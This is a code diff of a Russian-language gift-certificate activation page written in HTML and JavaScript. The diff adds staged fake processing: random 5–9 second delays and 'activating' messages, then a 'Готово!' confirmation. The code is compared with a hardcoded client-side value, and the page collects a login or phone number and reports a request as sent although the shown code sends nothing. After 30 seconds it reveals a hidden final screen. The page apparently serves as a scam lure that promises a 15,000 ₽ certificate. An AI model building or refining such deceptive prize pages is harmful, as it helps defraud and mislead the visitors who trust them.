@@ -134,7 +134,7 @@
               </div>
             </div>
             <button class="btn" type="submit">Активировать</button>
-            <div id="success" class="status ok"><div class="dot"></div><div><strong>Готово!</strong> Сертификат будет привязан к вашему аккаунту.</div></div>
+            <div id="success" class="status info"><div class="dot"></div><div id="successText">Активируем код…</div></div>
           </form>
         </div>
 
@@ -171,10 +171,11 @@
     const phoneInput = document.getElementById('phone');
     const loginInput = document.getElementById('login');
     const success = document.getElementById('success');
+    const successText = document.getElementById('successText');
 
-    const showStatus = (type, text) => {
-      codeStatus.className = 'status ' + type + ' show';
-      codeStatusText.textContent = text;
+    const showStatus = (el, type, text) => {
+      el.className = 'status ' + type + ' show';
+      el.querySelector('div:last-child').textContent = text;
     };
     const normalizeCode = v => (v || '').toUpperCase().trim();
     const cleanPhone = v => (v || '').replace(/[^\d+]/g,'');
@@ -183,19 +184,19 @@
     codeForm.addEventListener('submit', (e) => {
       e.preventDefault();
       const code = normalizeCode(giftInput.value);
-      if (!code) { showStatus('err', 'Введите код сертификата.'); return; }
+      if (!code) { showStatus(codeStatus, 'err', 'Введите код сертификата.'); return; }
 
-      showStatus('info', 'Проверяем код…');
+      showStatus(codeStatus, 'info', 'Проверяем код…');
       document.getElementById('checkBtn').disabled = true;
 
       const delay = 6000 + Math.floor(Math.random() * 3000);
       setTimeout(() => {
         if (code === VALID_CODE) {
-          showStatus('ok', 'Код принят! Доступен сертификат на 15\u00A0000 \u20BD.');
+          showStatus(codeStatus, 'ok', 'Код принят! Доступен сертификат на 15\u00A0000 \u20BD.');
           amountBadge.classList.add('show');
           step2.classList.remove('hidden');
         } else {
-          showStatus('err', 'Код недействителен.');
+          showStatus(codeStatus, 'err', 'Код недействителен.');
           document.getElementById('checkBtn').disabled = false;
         }
       }, delay);
@@ -213,17 +214,24 @@
         alert('Укажите логин (мин. 3 символа) или телефон.');
         return;
       }
-      console.log('Gift claim payload', { login, phone, code: VALID_CODE });
-      success.classList.add('show');
+
+      // Показать процесс активации
+      showStatus(success, 'info', 'Активируем код…');
       actForm.querySelector('.btn').disabled = true;
       actForm.querySelector('.btn').textContent = 'Заявка отправлена';
 
-      // Через 30 секунд показать финальный экран
+      // задержка 5–9 секунд
+      const delay = 5000 + Math.floor(Math.random() * 4000);
       setTimeout(() => {
-        step1.classList.add('hidden');
-        step2.classList.add('hidden');
-        finalAction.classList.remove('hidden');
-      }, 30000);
+        showStatus(success, 'ok', 'Готово! Сертификат будет привязан к вашему аккаунту.');
+
+        // Через 30 секунд показать финальный экран
+        setTimeout(() => {
+          step1.classList.add('hidden');
+          step2.classList.add('hidden');
+          finalAction.classList.remove('hidden');
+        }, 30000);
+      }, delay);
     });
 
     // Автозаполнение кода из URL
